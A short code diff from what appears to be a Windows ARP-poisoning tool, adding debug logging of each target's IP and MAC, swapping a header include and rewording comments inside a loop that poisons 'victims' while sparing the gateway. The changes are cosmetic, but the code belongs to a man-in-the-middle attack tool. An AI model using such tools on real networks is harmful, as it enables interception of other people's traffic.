@@ -7,7 +7,8 @@
 #include <iphlpapi.h>
 
 #include "APE.h"
-#include "Packets.h"
+//#include "Packets.h"
+#include "ArpPoisoning.h"
 #include "LinkedListSystems.h"
 #include "NetworkFunctions.h"
 
@@ -56,11 +57,19 @@ DWORD WINAPI StartArpPoisoning(LPVOID scanParamsParam)
 
       if ((numberSystems = GetListCopy(gSystemsList, systemList)) > 0)
       {
-        LogMsg(DBG_LOW, "StartArpPoisoning(): New Round with %d systems", numberSystems);
+        LogMsg(DBG_LOW, "StartArpPoisoning(): New Round with %d system(s)", numberSystems);
 
         // Iterate through all systems
         for (counter = 0; counter < numberSystems && counter < MAX_SYSTEMS_COUNT; counter++)
         {
+          LogMsg(DBG_LOW, "StartArpPoisoning(): #%i: %s -> %02x-%02x-%02x-%02x-%02x-%02x", counter, systemList[counter].sysIpStr,
+            systemList[counter].sysMacBin[0],
+            systemList[counter].sysMacBin[1],
+            systemList[counter].sysMacBin[2],
+            systemList[counter].sysMacBin[3],
+            systemList[counter].sysMacBin[4],
+            systemList[counter].sysMacBin[5]
+          );
           // Dont poison the GW with a new MAC.
           if (memcmp(systemList[counter].sysIpBin, scanParams.gatewayIpBin, BIN_IP_LEN) == 0) 
           {
@@ -73,7 +82,7 @@ DWORD WINAPI StartArpPoisoning(LPVOID scanParamsParam)
 
 
             /*
-             * HACK : I dont get it how this can happen but sometimes ARP requests
+             * HACK : No clue how this can happen!! Sometimes ARP requests
              * destined for our own system dont arrive :/ 
              * We have to send back our MAC/IP to all victims manually
              */
